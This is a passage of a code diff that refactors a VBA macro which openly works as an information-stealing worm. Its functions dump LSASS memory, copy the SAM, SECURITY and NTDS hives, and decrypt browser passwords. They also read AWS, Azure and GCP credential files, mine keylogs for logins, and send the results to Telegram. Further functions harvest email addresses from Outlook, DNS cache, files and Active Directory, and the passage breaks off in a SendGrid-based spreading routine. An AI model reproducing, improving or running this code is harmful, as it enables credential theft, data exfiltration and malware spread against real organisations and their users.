-    Dim ntdsPath As String: ntdsPath = GetTempDir() & "ntds.dit": Dim systemPath As String: systemPath = GetTempDir() & "SYSTEM"
+    On Error Resume Next
+    If Not IsUserAdmin() Then Exit Sub
+    Dim ntdsPath As String: ntdsPath = GetTempDir() & "ntds.dit"
+    Dim systemPath As String: systemPath = GetTempDir() & "SYSTEM"
     If Not FileExists(ntdsPath) Or Not FileExists(systemPath) Then Exit Sub
     Dim psScript As String: psScript = "Import-Module ActiveDirectory -ErrorAction SilentlyContinue;" & vbCrLf & _
                "if (Get-Command Get-ADReplAccount -ErrorAction SilentlyContinue) {" & vbCrLf & _
@@ -888,98 +1075,188 @@ Sub ExtractHashesFromNTDS()
                "    };" & vbCrLf & _
                "    if ($hashes) { $hashes -join \"`n\" } else { Write-Output 'NO_HASHES' }" & vbCrLf & _
                "} else { Write-Output 'NO_MODULE' }"
-    Dim psFile As String: psFile = GetTempDir() & "extract.ps1": Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
-    Dim f As Object: Set f = fso.CreateTextFile(psFile, True): f.Write psScript: f.Close
-    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell"): wsh.Run "powershell -ep bypass -File """ & psFile & """ > """ & GetTempDir() & "hashes.txt""", 0, True
-    StealthSleep 5000: Dim output As String: output = ""
+    Dim psFile As String: psFile = GetTempDir() & "extract.ps1"
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim f As Object: Set f = fso.CreateTextFile(psFile, True)
+    f.Write psScript
+    f.Close
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    wsh.Run "powershell -ep bypass -File """ & psFile & """ > """ & GetTempDir() & "hashes.txt""", 0, True
+    StealthSleep 5000
+    Dim output As String: output = ""
     If fso.FileExists(GetTempDir() & "hashes.txt") Then
-        Dim ts As Object: Set ts = fso.OpenTextFile(GetTempDir() & "hashes.txt", 1): output = ts.ReadAll: ts.Close
-    End If: fso.DeleteFile psFile: fso.DeleteFile GetTempDir() & "hashes.txt"
+        Dim ts As Object: Set ts = fso.OpenTextFile(GetTempDir() & "hashes.txt", 1)
+        output = ts.ReadAll
+        ts.Close
+    End If
+    fso.DeleteFile psFile
+    fso.DeleteFile GetTempDir() & "hashes.txt"
     If output <> "" And output <> "NO_HASHES" And output <> "NO_MODULE" Then
         SendToTelegramChunked "NTDS_HASHES|" & output
     Else
         If fso.FileExists(ntdsPath) Then
-            Dim stream As Object: Set stream = CreateObject("ADODB.Stream"): stream.Type = 1: stream.Open: stream.LoadFromFile ntdsPath
-            Dim data() As Byte: data = stream.Read: stream.Close: SendToTelegramChunked "NTDS_RAW|" & EncodeBase64(data)
+            Dim stream As Object: Set stream = CreateObject("ADODB.Stream")
+            stream.Type = 1
+            stream.Open
+            stream.LoadFromFile ntdsPath
+            Dim data() As Byte: data = stream.Read
+            stream.Close
+            SendToTelegramChunked "NTDS_RAW|" & EncodeBase64(data)
         End If
         If fso.FileExists(systemPath) Then
-            Dim stream2 As Object: Set stream2 = CreateObject("ADODB.Stream"): stream2.Type = 1: stream2.Open: stream2.LoadFromFile systemPath
-            Dim data2() As Byte: data2 = stream2.Read: stream2.Close: SendToTelegramChunked "SYSTEM_RAW|" & EncodeBase64(data2)
+            Dim stream2 As Object: Set stream2 = CreateObject("ADODB.Stream")
+            stream2.Type = 1
+            stream2.Open
+            stream2.LoadFromFile systemPath
+            Dim data2() As Byte: data2 = stream2.Read
+            stream2.Close
+            SendToTelegramChunked "SYSTEM_RAW|" & EncodeBase64(data2)
         End If
-    End If: fso.DeleteFile ntdsPath: fso.DeleteFile systemPath
+    End If
+    fso.DeleteFile ntdsPath
+    fso.DeleteFile systemPath
 End Sub
 
 ' ============================================================
 ' 11. CREDENTIAL THEFT (Full coverage)
 ' ============================================================
 Sub DumpLSASS()
-    On Error Resume Next: If Not IsUserAdmin() Then Exit Sub
-    Dim pid As Long: Dim snap As LongPtr: snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+    On Error Resume Next
+    If Not IsUserAdmin() Then Exit Sub
+    Dim pid As Long
+#If VBA7 Then
+    Dim snap As LongPtr
+#Else
+    Dim snap As Long
+#End If
+    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
     If snap <> -1 Then
         Dim pe As PROCESSENTRY32: pe.dwSize = Len(pe)
         If Process32First(snap, pe) Then
-            Do: If InStr(1, pe.szExeFile, "lsass.exe", vbTextCompare) > 0 Then pid = pe.th32ProcessID: Exit Do
+            Do
+                If InStr(1, pe.szExeFile, "lsass.exe", vbTextCompare) > 0 Then
+                    pid = pe.th32ProcessID
+                    Exit Do
+                End If
             Loop While Process32Next(snap, pe)
-        End If: CloseHandle snap
-    End If: If pid = 0 Then Exit Sub
-    Dim dumpPath As String: dumpPath = GetTempDir() & "lsass.dmp": Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
-    wsh.Run "rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump " & pid & " " & dumpPath & " full", 0, True: StealthSleep 3000
+        End If
+        CloseHandle snap
+    End If
+    If pid = 0 Then Exit Sub
+    Dim dumpPath As String: dumpPath = GetTempDir() & "lsass.dmp"
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    wsh.Run "rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump " & pid & " " & dumpPath & " full", 0, True
+    StealthSleep 3000
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
     If Not fso.FileExists(dumpPath) Then
         Dim procdumpPath As String: procdumpPath = GetTempDir() & "procdump.exe"
         Dim procdumpUrls As Variant: procdumpUrls = Array("https://live.sysinternals.com/procdump.exe", "https://download.sysinternals.com/files/Procdump.zip")
-        Dim url As Variant: For Each url In procdumpUrls: If RobustDownloadFile(url, procdumpPath, 3) Then Exit For: Next
-        If FileExists(procdumpPath) Then wsh.Run procdumpPath & " -accepteula -ma " & pid & " " & dumpPath, 0, True: StealthSleep 5000: Kill procdumpPath
+        Dim url As Variant
+        For Each url In procdumpUrls
+            If RobustDownloadFile(url, procdumpPath, 3) Then Exit For
+        Next
+        If FileExists(procdumpPath) Then
+            wsh.Run procdumpPath & " -accepteula -ma " & pid & " " & dumpPath, 0, True
+            StealthSleep 5000
+            Kill procdumpPath
+        End If
     End If
     If fso.FileExists(dumpPath) Then
-        Dim stream As Object: Set stream = CreateObject("ADODB.Stream"): stream.Type = 1: stream.Open: stream.LoadFromFile dumpPath
-        Dim data() As Byte: data = stream.Read: stream.Close: SendToTelegramChunked "LSASS_DUMP|" & EncodeBase64(data): fso.DeleteFile dumpPath
+        Dim stream As Object: Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1
+        stream.Open
+        stream.LoadFromFile dumpPath
+        Dim data() As Byte: data = stream.Read
+        stream.Close
+        SendToTelegramChunked "LSASS_DUMP|" & EncodeBase64(data)
+        fso.DeleteFile dumpPath
     End If
 End Sub
 
 Sub DumpSAM()
-    On Error Resume Next: If Not IsUserAdmin() Then Exit Sub
-    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell"): Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
-    Dim vssOut As String: vssOut = GetTempDir() & "vss.out": wsh.Run "cmd /c vssadmin create shadow /for=C: > """ & vssOut & """ 2>&1", 0, True
-    StealthSleep 2000: Dim ts As Object: Set ts = fso.OpenTextFile(vssOut, 1): Dim line As String, shadowVolume As String
-    Do While Not ts.AtEndOfStream: line = ts.ReadLine
-        If InStr(line, "Shadow Copy Volume Name:") > 0 Then shadowVolume = Trim(Mid(line, InStr(line, ":") + 2)): Exit Do
-    Loop: ts.Close: fso.DeleteFile vssOut: If shadowVolume = "" Then Exit Sub
-    wsh.Run "cmd /c mklink /d C:\shadowcopy """ & shadowVolume & """", 0, True: StealthSleep 2000
+    On Error Resume Next
+    If Not IsUserAdmin() Then Exit Sub
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim vssOut As String: vssOut = GetTempDir() & "vss.out"
+    wsh.Run "cmd /c vssadmin create shadow /for=C: > """ & vssOut & """ 2>&1", 0, True
+    StealthSleep 2000
+    Dim ts As Object: Set ts = fso.OpenTextFile(vssOut, 1)
+    Dim line As String, shadowVolume As String
+    Do While Not ts.AtEndOfStream
+        line = ts.ReadLine
+        If InStr(line, "Shadow Copy Volume Name:") > 0 Then
+            shadowVolume = Trim(Mid(line, InStr(line, ":") + 2))
+            Exit Do
+        End If
+    Loop
+    ts.Close
+    fso.DeleteFile vssOut
+    If shadowVolume = "" Then Exit Sub
+    wsh.Run "cmd /c mklink /d C:\shadowcopy """ & shadowVolume & """", 0, True
+    StealthSleep 2000
     wsh.Run "cmd /c copy C:\shadowcopy\Windows\System32\config\SAM " & GetTempDir() & "SAM", 0, True
-    wsh.Run "cmd /c copy C:\shadowcopy\Windows\System32\config\SECURITY " & GetTempDir() & "SECURITY", 0, True: StealthSleep 3000
+    wsh.Run "cmd /c copy C:\shadowcopy\Windows\System32\config\SECURITY " & GetTempDir() & "SECURITY", 0, True
+    StealthSleep 3000
     wsh.Run "cmd /c rmdir C:\shadowcopy", 0, True
     If fso.FileExists(GetTempDir() & "SAM") Then
-        Dim stream As Object: Set stream = CreateObject("ADODB.Stream"): stream.Type = 1: stream.Open: stream.LoadFromFile GetTempDir() & "SAM"
-        Dim data() As Byte: data = stream.Read: stream.Close: SendToTelegramChunked "SAM|" & EncodeBase64(data)
+        Dim stream As Object: Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1
+        stream.Open
+        stream.LoadFromFile GetTempDir() & "SAM"
+        Dim data() As Byte: data = stream.Read
+        stream.Close
+        SendToTelegramChunked "SAM|" & EncodeBase64(data)
         If fso.FileExists(GetTempDir() & "SECURITY") Then
-            stream.Open: stream.LoadFromFile GetTempDir() & "SECURITY": data = stream.Read: stream.Close
+            stream.Open
+            stream.LoadFromFile GetTempDir() & "SECURITY"
+            data = stream.Read
+            stream.Close
             SendToTelegramChunked "SECURITY|" & EncodeBase64(data)
-        End If: fso.DeleteFile GetTempDir() & "SAM": fso.DeleteFile GetTempDir() & "SECURITY"
+        End If
+        fso.DeleteFile GetTempDir() & "SAM"
+        fso.DeleteFile GetTempDir() & "SECURITY"
     End If
 End Sub
 
 Sub StealCloudCredentials()
-    On Error Resume Next: Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject"): Dim userProfile As String: userProfile = Environ("USERPROFILE")
-    Dim awsPath As String: awsPath = userProfile & "\.aws\credentials": If fso.FileExists(awsPath) Then
-        Dim ts As Object: Set ts = fso.OpenTextFile(awsPath, 1): Dim content As String: content = ts.ReadAll: ts.Close: SendToTelegramChunked "CLOUD_AWS|" & content
+    On Error Resume Next
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim userProfile As String: userProfile = Environ("USERPROFILE")
+    Dim awsPath As String: awsPath = userProfile & "\.aws\credentials"
+    If fso.FileExists(awsPath) Then
+        Dim ts As Object: Set ts = fso.OpenTextFile(awsPath, 1)
+        Dim content As String: content = ts.ReadAll
+        ts.Close
+        SendToTelegramChunked "CLOUD_AWS|" & content
     End If
-    Dim azurePath As String: azurePath = userProfile & "\.azure\accessTokens.json": If fso.FileExists(azurePath) Then
-        Dim ts As Object: Set ts = fso.OpenTextFile(azurePath, 1): content = ts.ReadAll: ts.Close: SendToTelegramChunked "CLOUD_AZURE|" & content
+    Dim azurePath As String: azurePath = userProfile & "\.azure\accessTokens.json"
+    If fso.FileExists(azurePath) Then
+        Dim ts As Object: Set ts = fso.OpenTextFile(azurePath, 1)
+        content = ts.ReadAll
+        ts.Close
+        SendToTelegramChunked "CLOUD_AZURE|" & content
     End If
-    Dim gcpPath As String: gcpPath = userProfile & "\.config\gcloud\application_default_credentials.json": If fso.FileExists(gcpPath) Then
-        Dim ts As Object: Set ts = fso.OpenTextFile(gcpPath, 1): content = ts.ReadAll: ts.Close: SendToTelegramChunked "CLOUD_GCP|" & content
+    Dim gcpPath As String: gcpPath = userProfile & "\.config\gcloud\application_default_credentials.json"
+    If fso.FileExists(gcpPath) Then
+        Dim ts As Object: Set ts = fso.OpenTextFile(gcpPath, 1)
+        content = ts.ReadAll
+        ts.Close
+        SendToTelegramChunked "CLOUD_GCP|" & content
     End If
 End Sub
 
 Sub StealBrowserData()
-    On Error Resume Next: Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
-    Dim localAppData As String: localAppData = Environ("LOCALAPPDATA"): Dim appData As String: appData = Environ("APPDATA")
+    On Error Resume Next
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim localAppData As String: localAppData = Environ("LOCALAPPDATA")
+    Dim appData As String: appData = Environ("APPDATA")
     Dim browsers As Variant: browsers = Array(localAppData & "\Google\Chrome\User Data\Default\Login Data", _
                      localAppData & "\Microsoft\Edge\User Data\Default\Login Data", _
                      localAppData & "\Google\Chrome\User Data\Profile 1\Login Data", _
                      localAppData & "\Microsoft\Edge\User Data\Profile 1\Login Data")
-    Dim b As Variant: For Each b In browsers
+    Dim b As Variant
+    For Each b In browsers
         If fso.FileExists(b) Then
             Dim tempCopy As String: tempCopy = GetTempDir() & "logins_" & Replace(Replace(Replace(b, "\", "_"), ":", ""), " ", "") & ".db"
             fso.CopyFile b, tempCopy, True
@@ -1004,26 +1281,43 @@ Sub StealBrowserData()
                        "} " & _
                        "$conn.Close(); $results -join '`n'"
             Dim psFile As String: psFile = GetTempDir() & "decrypt_" & Timer & ".ps1"
-            Dim f As Object: Set f = fso.CreateTextFile(psFile, True): f.Write psScript: f.Close
-            Dim wsh As Object: Set wsh = CreateObject("WScript.Shell"): Dim outFile As String: outFile = GetTempDir() & "logins_" & Timer & ".txt"
-            wsh.Run "powershell -ep bypass -File """ & psFile & """ > """ & outFile & """", 0, True: StealthSleep 5000
+            Dim f As Object: Set f = fso.CreateTextFile(psFile, True)
+            f.Write psScript
+            f.Close
+            Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+            Dim outFile As String: outFile = GetTempDir() & "logins_" & Timer & ".txt"
+            wsh.Run "powershell -ep bypass -File """ & psFile & """ > """ & outFile & """", 0, True
+            StealthSleep 5000
             If fso.FileExists(outFile) Then
-                Dim ts As Object: Set ts = fso.OpenTextFile(outFile, 1): Dim logins As String: logins = ts.ReadAll: ts.Close
-                If logins <> "" And InStr(logins, "NO_SQLITE") = 0 Then SendToTelegramChunked "BROWSER_LOGINS|" & Left(b, InStrRev(b, "\") - 1) & "|" & logins
+                Dim ts As Object: Set ts = fso.OpenTextFile(outFile, 1)
+                Dim logins As String: logins = ts.ReadAll
+                ts.Close
+                If logins <> "" And InStr(logins, "NO_SQLITE") = 0 Then
+                    SendToTelegramChunked "BROWSER_LOGINS|" & Left(b, InStrRev(b, "\") - 1) & "|" & logins
+                End If
                 fso.DeleteFile outFile
-            End If: fso.DeleteFile psFile: fso.DeleteFile tempCopy
+            End If
+            fso.DeleteFile psFile
+            fso.DeleteFile tempCopy
         End If
     Next
     Dim firefoxProfilesPath As String: firefoxProfilesPath = appData & "\Mozilla\Firefox\Profiles"
     If fso.FolderExists(firefoxProfilesPath) Then
-        Dim folder As Object: Set folder = fso.GetFolder(firefoxProfilesPath): Dim subFolder As Object
+        Dim folder As Object: Set folder = fso.GetFolder(firefoxProfilesPath)
+        Dim subFolder As Object
         For Each subFolder In folder.SubFolders
-            Dim ffFiles As Variant: ffFiles = Array("logins.json", "key4.db"): Dim file As Variant
+            Dim ffFiles As Variant: ffFiles = Array("logins.json", "key4.db")
+            Dim file As Variant
             For Each file In ffFiles
                 Dim fullPath As String: fullPath = subFolder.Path & "\" & file
                 If fso.FileExists(fullPath) Then
-                    Dim stream As Object: Set stream = CreateObject("ADODB.Stream"): stream.Type = 1: stream.Open: stream.LoadFromFile fullPath
-                    Dim data() As Byte: data = stream.Read: stream.Close: SendToTelegramChunked "FIREFOX_" & subFolder.Name & "_" & file & "|" & EncodeBase64(data)
+                    Dim stream As Object: Set stream = CreateObject("ADODB.Stream")
+                    stream.Type = 1
+                    stream.Open
+                    stream.LoadFromFile fullPath
+                    Dim data() As Byte: data = stream.Read
+                    stream.Close
+                    SendToTelegramChunked "FIREFOX_" & subFolder.Name & "_" & file & "|" & EncodeBase64(data)
                 End If
             Next
         Next
@@ -1039,81 +1333,176 @@ Sub StealAllCredentials()
 End Sub
 
 Private Sub ExtractCredentialsFromKeylog()
-    On Error Resume Next: If gKeylogFile = "" Then Exit Sub: If Not FileExists(gKeylogFile) Then Exit Sub
-    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject"): Dim ts As Object: Set ts = fso.OpenTextFile(gKeylogFile, 1)
-    Dim content As String: content = ts.ReadAll: ts.Close
-    Dim regex As Object: Set regex = CreateObject("VBScript.RegExp"): regex.Pattern = "((?:email|user|login|id)\b\W*|\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*(?:[:=,;]\s*)(\S{4,})"
-    regex.Global = True: regex.IgnoreCase = True: Dim matches As Object: Set matches = regex.Execute(content): Dim m As Object
-    For Each m In matches: Dim subMatches As Variant: subMatches = m.SubMatches
+    On Error Resume Next
+    If gKeylogFile = "" Then Exit Sub
+    If Not FileExists(gKeylogFile) Then Exit Sub
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim ts As Object: Set ts = fso.OpenTextFile(gKeylogFile, 1)
+    Dim content As String: content = ts.ReadAll
+    ts.Close
+    Dim regex As Object: Set regex = CreateObject("VBScript.RegExp")
+    regex.Pattern = "((?:email|user|login|id)\b\W*|\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*(?:[:=,;]\s*)(\S{4,})"
+    regex.Global = True
+    regex.IgnoreCase = True
+    Dim matches As Object: Set matches = regex.Execute(content)
+    Dim m As Variant
+    For Each m In matches
+        Dim subMatches As Variant: subMatches = m.SubMatches
         If UBound(subMatches) >= 1 Then
-            On Error Resume Next: g_stolenCredentials.Add subMatches(0) & "|" & subMatches(1), subMatches(0) & "|" & subMatches(1)
-            If Err.Number = 0 Then SendToTelegram "STOLEN_CRED|" & subMatches(0) & "|" & subMatches(1) Else Err.Clear
+            On Error Resume Next
+            g_stolenCredentials.Add subMatches(0) & "|" & subMatches(1), subMatches(0) & "|" & subMatches(1)
+            If Err.Number = 0 Then
+                SendToTelegram "STOLEN_CRED|" & subMatches(0) & "|" & subMatches(1)
+            Else
+                Err.Clear
+            End If
         End If
     Next
 End Sub
 
-Private Sub ExtractAllCredentials(): ExtractCredentialsFromKeylog: End Sub
+Private Sub ExtractAllCredentials()
+    ExtractCredentialsFromKeylog
+End Sub
 
 ' ============================================================
 ' 12. HARVEST EMAIL TARGETS
 ' ============================================================
 Private Sub HarvestFromOutlookContacts()
-    On Error Resume Next: Dim outlookApp As Object: Set outlookApp = GetObject(, "Outlook.Application")
+    On Error Resume Next
+    Dim outlookApp As Object
+    Set outlookApp = GetObject(, "Outlook.Application")
     If outlookApp Is Nothing Then Set outlookApp = CreateObject("Outlook.Application")
-    If outlookApp Is Nothing Then Exit Sub: Dim mapi As Object: Set mapi = outlookApp.GetNamespace("MAPI")
-    If mapi Is Nothing Then Exit Sub: Dim contacts As Object: Set contacts = mapi.GetDefaultFolder(10).Items: Dim contact As Object
+    If outlookApp Is Nothing Then Exit Sub
+    Dim mapi As Object
+    Set mapi = outlookApp.GetNamespace("MAPI")
+    If mapi Is Nothing Then Exit Sub
+    Dim contacts As Object
+    Set contacts = mapi.GetDefaultFolder(10).Items
+    Dim contact As Object
     For Each contact In contacts
-        If contact.Email1Address <> "" Then On Error Resume Next: g_emailTargets.Add contact.Email1Address, contact.Email1Address: Err.Clear
-        If contact.Email2Address <> "" Then On Error Resume Next: g_emailTargets.Add contact.Email2Address, contact.Email2Address: Err.Clear
-        If contact.Email3Address <> "" Then On Error Resume Next: g_emailTargets.Add contact.Email3Address, contact.Email3Address: Err.Clear
+        If contact.Email1Address <> "" Then
+            On Error Resume Next
+            g_emailTargets.Add contact.Email1Address, contact.Email1Address
+            Err.Clear
+        End If
+        If contact.Email2Address <> "" Then
+            On Error Resume Next
+            g_emailTargets.Add contact.Email2Address, contact.Email2Address
+            Err.Clear
+        End If
+        If contact.Email3Address <> "" Then
+            On Error Resume Next
+            g_emailTargets.Add contact.Email3Address, contact.Email3Address
+            Err.Clear
+        End If
     Next
 End Sub
 
 Private Sub HarvestFromDNSCache()
-    On Error Resume Next: Dim wsh As Object: Set wsh = CreateObject("WScript.Shell"): Dim dnsFile As String: dnsFile = GetTempDir() & "dns_" & Timer & ".txt"
-    wsh.Run "cmd /c ipconfig /displaydns > """ & dnsFile & """", 0, True: StealthSleep 2000: Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
-    If Not fso.FileExists(dnsFile) Then Exit Sub: Dim ts As Object: Set ts = fso.OpenTextFile(dnsFile, 1): Dim content As String: content = ts.ReadAll: ts.Close: fso.DeleteFile dnsFile
-    Dim regex As Object: Set regex = CreateObject("VBScript.RegExp"): regex.Pattern = "\b([a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(?:\.[a-zA-Z]{2,})?)\b": regex.Global = True
-    Dim matches As Object: Set matches = regex.Execute(content): Dim domains As New Collection: Dim m As Object
-    For Each m In matches: On Error Resume Next: domains.Add m.Value, m.Value: Err.Clear: Next
-    Dim d As Variant: For Each d In domains
-        On Error Resume Next: g_emailTargets.Add "admin@" & d, "admin@" & d: g_emailTargets.Add "it@" & d, "it@" & d
-        g_emailTargets.Add "support@" & d, "support@" & d: g_emailTargets.Add "hr@" & d, "hr@" & d: g_emailTargets.Add "finance@" & d, "finance@" & d: Err.Clear
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    Dim dnsFile As String: dnsFile = GetTempDir() & "dns_" & Timer & ".txt"
+    wsh.Run "cmd /c ipconfig /displaydns > """ & dnsFile & """", 0, True
+    StealthSleep 2000
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FileExists(dnsFile) Then Exit Sub
+    Dim ts As Object: Set ts = fso.OpenTextFile(dnsFile, 1)
+    Dim content As String: content = ts.ReadAll
+    ts.Close
+    fso.DeleteFile dnsFile
+    Dim regex As Object: Set regex = CreateObject("VBScript.RegExp")
+    regex.Pattern = "\b([a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(?:\.[a-zA-Z]{2,})?)\b"
+    regex.Global = True
+    Dim matches As Object: Set matches = regex.Execute(content)
+    Dim domains As New Collection
+    Dim m As Variant
+    For Each m In matches
+        On Error Resume Next
+        domains.Add m.Value, m.Value
+        Err.Clear
+    Next
+    Dim d As Variant
+    For Each d In domains
+        On Error Resume Next
+        g_emailTargets.Add "admin@" & d, "admin@" & d
+        g_emailTargets.Add "it@" & d, "it@" & d
+        g_emailTargets.Add "support@" & d, "support@" & d
+        g_emailTargets.Add "hr@" & d, "hr@" & d
+        g_emailTargets.Add "finance@" & d, "finance@" & d
+        Err.Clear
     Next
 End Sub
 
 Private Sub HarvestFromLocalFiles()
-    On Error Resume Next: Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject"): Dim folders As Variant: folders = Array(Environ("USERPROFILE"), GetTempDir(), Environ("APPDATA"))
-    Dim regex As Object: Set regex = CreateObject("VBScript.RegExp"): regex.Pattern = "\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b": regex.Global = True
-    Dim folderPath As Variant: For Each folderPath In folders
-        If Not fso.FolderExists(folderPath) Then GoTo NextFolder: Dim folder As Object: Set folder = fso.GetFolder(folderPath): Dim file As Object
-        For Each file In folder.Files: Dim ext As String: ext = LCase(fso.GetExtensionName(file.Name))
+    On Error Resume Next
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim folders As Variant: folders = Array(Environ("USERPROFILE"), GetTempDir(), Environ("APPDATA"))
+    Dim regex As Object: Set regex = CreateObject("VBScript.RegExp")
+    regex.Pattern = "\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b"
+    regex.Global = True
+    Dim folderPath As Variant
+    For Each folderPath In folders
+        If Not fso.FolderExists(folderPath) Then GoTo NextFolder
+        Dim folder As Object: Set folder = fso.GetFolder(folderPath)
+        Dim file As Variant
+        For Each file In folder.Files
+            Dim ext As String: ext = LCase(fso.GetExtensionName(file.Name))
             If InStr(".txt.eml.msg.docx.xlsx.pdf", ext) > 0 Then
-                On Error Resume Next: Dim ts As Object: Set ts = fso.OpenTextFile(file.Path, 1): Dim content As String: content = ts.ReadAll: ts.Close
-                Dim matches As Object: Set matches = regex.Execute(content): Dim m As Object
-                For Each m In matches: On Error Resume Next: g_emailTargets.Add m.Value, m.Value: Err.Clear: Next
+                On Error Resume Next
+                Dim ts As Object: Set ts = fso.OpenTextFile(file.Path, 1)
+                Dim content As String: content = ts.ReadAll
+                ts.Close
+                Dim matches As Object: Set matches = regex.Execute(content)
+                Dim m As Variant
+                For Each m In matches
+                    On Error Resume Next
+                    g_emailTargets.Add m.Value, m.Value
+                    Err.Clear
+                Next
             End If
         Next
-NextFolder: Next
+NextFolder:
+    Next
 End Sub
 
 Private Sub HarvestFromActiveDirectory()
-    On Error Resume Next: If Not IsUserAdmin() Then Exit Sub
-    Dim psFile As String: psFile = GetTempDir() & "ad_" & Timer & ".ps1": Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
-    Dim f As Object: Set f = fso.CreateTextFile(psFile, True): f.WriteLine "Import-Module ActiveDirectory -ErrorAction SilentlyContinue;"
-    f.WriteLine "if ($LASTEXITCODE -ne 0) { Write-Output 'NO_AD_MODULE'; exit }": f.WriteLine "Get-ADUser -Filter * | Select-Object -ExpandProperty UserPrincipalName"
-    f.Close: Dim wsh As Object: Set wsh = CreateObject("WScript.Shell"): Dim outFile As String: outFile = GetTempDir() & "ad_users_" & Timer & ".txt"
-    wsh.Run "powershell -ep bypass -File """ & psFile & """ > """ & outFile & """", 0, True: StealthSleep 5000
+    On Error Resume Next
+    If Not IsUserAdmin() Then Exit Sub
+    Dim psFile As String: psFile = GetTempDir() & "ad_" & Timer & ".ps1"
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim f As Object: Set f = fso.CreateTextFile(psFile, True)
+    f.WriteLine "Import-Module ActiveDirectory -ErrorAction SilentlyContinue;"
+    f.WriteLine "if ($LASTEXITCODE -ne 0) { Write-Output 'NO_AD_MODULE'; exit }"
+    f.WriteLine "Get-ADUser -Filter * | Select-Object -ExpandProperty UserPrincipalName"
+    f.Close
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    Dim outFile As String: outFile = GetTempDir() & "ad_users_" & Timer & ".txt"
+    wsh.Run "powershell -ep bypass -File """ & psFile & """ > """ & outFile & """", 0, True
+    StealthSleep 5000
     If fso.FileExists(outFile) Then
-        Dim ts As Object: Set ts = fso.OpenTextFile(outFile, 1): Dim line As String
-        Do While Not ts.AtEndOfStream: line = ts.ReadLine
-            If InStr(line, "@") > 0 And InStr(line, "NO_AD_MODULE") = 0 Then On Error Resume Next: g_emailTargets.Add line, line: Err.Clear
-        Loop: ts.Close: fso.DeleteFile outFile
-    End If: fso.DeleteFile psFile
+        Dim ts As Object: Set ts = fso.OpenTextFile(outFile, 1)
+        Dim line As String
+        Do While Not ts.AtEndOfStream
+            line = ts.ReadLine
+            If InStr(line, "@") > 0 And InStr(line, "NO_AD_MODULE") = 0 Then
+                On Error Resume Next
+                g_emailTargets.Add line, line
+                Err.Clear
+            End If
+        Loop
+        ts.Close
+        fso.DeleteFile outFile
+    End If
+    fso.DeleteFile psFile
 End Sub
 
 Private Sub HarvestAllEmailTargets()
-    On Error Resume Next: Set g_emailTargets = New Collection: HarvestFromOutlookContacts: HarvestFromDNSCache: HarvestFromLocalFiles: HarvestFromActiveDirectory
+    On Error Resume Next
+    Set g_emailTargets = New Collection
+    HarvestFromOutlookContacts
+    HarvestFromDNSCache
+    HarvestFromLocalFiles
+    HarvestFromActiveDirectory
     SendToTelegram "EMAIL_TARGETS_HARVESTED|COUNT=" & g_emailTargets.Count
 End Sub
 
@@ -1121,91 +1510,184 @@ End Sub
 ' 13. EMAIL PROPAGATION (5 methods)
 ' ============================================================
 Private Function SendEmailViaSendGrid(toAddr As String, attachmentPath As String) As Boolean
-    On Error GoTo Fail: Dim apiKey As String: apiKey = Environ("SENDGRID_API_KEY")
+    On Error GoTo Fail
+    Dim apiKey As String: apiKey = Environ("SENDGRID_API_KEY")
     If apiKey = "" Then
         Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
         Dim possiblePaths As Variant: possiblePaths = Array(Environ("USERPROFILE") & "\.sendgrid\api_key", Environ("APPDATA") & "\SendGrid\api_key.txt", GetTempDir() & "sendgrid_key.txt")
-        Dim p As Variant: For Each p In possiblePaths: If fso.FileExists(p) Then
-            Dim ts As Object: Set ts = fso.OpenTextFile(p, 1): apiKey = Trim(ts.ReadLine): ts.Close: If apiKey <> "" Then Exit For
-        End If: Next
-    End If: If apiKey = "" Then SendEmailViaSendGrid = False: Exit Function
-    Dim http As Object: Set http = CreateObject("WinHttp.WinHttpRequest.5.1"): Dim fileBytes() As Byte: Dim fso2 As Object: Set fso2 = CreateObject("Scripting.FileSystemObject")
-    Dim stream As Object: Set stream = CreateObject("ADODB.Stream"): stream.Type = 1: stream.Open: stream.LoadFromFile attachmentPath: fileBytes = stream.Read: stream.Close
+        Dim p As Variant
+        For Each p In possiblePaths
